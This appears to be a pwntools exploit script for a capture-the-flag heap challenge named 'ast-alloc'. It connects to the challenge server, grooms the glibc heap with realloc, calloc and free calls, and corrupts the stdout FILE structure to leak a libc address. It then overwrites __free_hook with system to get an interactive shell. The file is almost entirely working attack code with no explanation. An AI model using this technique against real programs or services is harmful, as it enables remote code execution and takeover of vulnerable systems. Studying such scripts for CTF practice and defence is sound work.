#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.19"
port = 8888
host = "ast-alloc.chal.ctf.westerns.tokyo"
port = 10001

context.arch = "amd64"    
r = remote(host,port)

def malloc(size,data):
    r.recvuntil("choice:")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.send(data)

def calloc(size,data):
    r.recvuntil("choice:")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.send(data)

def realloc(size,data):
    r.recvuntil("choice:")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.send(data)

def rfree():
    r.recvuntil("choice:")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(0))

def free(types):
    r.recvuntil("choice:")
    r.sendline("4")
    r.recvuntil(":")
    r.sendline(types)


realloc(0x590,'da')

realloc(0x500,'d')
rfree()
for i in range(7):
    realloc(0x80,'a'*8 + 'b'*8)
    free('r')
realloc(0x80,'a'*8 + 'b'*8)
rfree()
realloc(0x590,'da')
calloc(0x20,'/bin/sh\x00'+ p64(0x21))
realloc(0x500,'da')
rfree()
realloc(0x590,'\x00'*0x500 + p64(0x510) + p64(0xa0) + p16(0x6760) )
rfree()
realloc(0x80,'\x00')
malloc(0x80,p64(0xfbad3c80) + p64(0)*3 + "\x00")
r.recvuntil(p64(0xffffffffffffffff))
r.recvuntil("\x00"*0x8)
libc = u64(r.recv(8)) - 0x3eb780
print "libc:",hex(libc)
free('r')
rfree()

free_hook = libc + 0x3ed8e8
realloc(0x90,p64(free_hook))
realloc(-1,"")
realloc(0x90,'a')
realloc(-1,"")
system = libc + 0x4f440
realloc(0x90,p64(system))
free('c')
r.interactive()


